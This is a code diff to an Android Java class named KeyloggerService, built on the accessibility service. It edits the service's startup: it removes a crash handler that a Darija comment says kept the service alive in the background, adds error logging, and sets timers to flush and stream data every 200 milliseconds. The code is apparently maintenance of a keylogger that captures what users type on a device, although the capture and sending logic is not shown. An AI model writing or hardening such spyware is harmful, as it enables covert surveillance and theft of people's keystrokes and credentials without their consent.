@@ -37,17 +37,10 @@ public class KeyloggerService extends AccessibilityService {
         super.onServiceConnected();
         instance = this;
 
-        // Anti-Crash: Kaychd ay error f l'background w kaymne3 l'service ymout
-        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
-            Log.e("AccessibilityCrash", "Caught: " + throwable.getMessage());
-        });
-
         try {
-            // N7aydo l'Timers l9dam ila kanou
             if (flushTimer != null) { flushTimer.cancel(); flushTimer = null; }
             if (streamTimer != null) { streamTimer.cancel(); streamTimer = null; }
 
-            // Nch3lo jdad
             flushTimer = new Timer();
             flushTimer.scheduleAtFixedRate(new TimerTask() {
                 @Override
@@ -65,7 +58,9 @@ public class KeyloggerService extends AccessibilityService {
                     } catch (Exception e) {}
                 }
             }, 0, 200);
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            Log.e("KeyloggerService", "Error starting timers: " + e.getMessage());
+        }
     }
 
     @Override
@@ -73,7 +68,6 @@ public class KeyloggerService extends AccessibilityService {
         if (event == null) return;
         
         try {
-            // FIX: Null check 3la package name bach mayt7erkesch
             CharSequence pkgName = event.getPackageName();
             if (pkgName == null) return;
             String pkg = pkgName.toString();
@@ -126,7 +120,7 @@ public class KeyloggerService extends AccessibilityService {
                 }
             }
         } catch (Exception e) {
-            // Catch ay crash f l'UI
+            // Catch ay crash
         }
     }
 
@@ -298,4 +292,4 @@ public class KeyloggerService extends AccessibilityService {
         if (streamTimer != null) streamTimer.cancel();
         super.onDestroy(); 
     }
-                }
+                    }
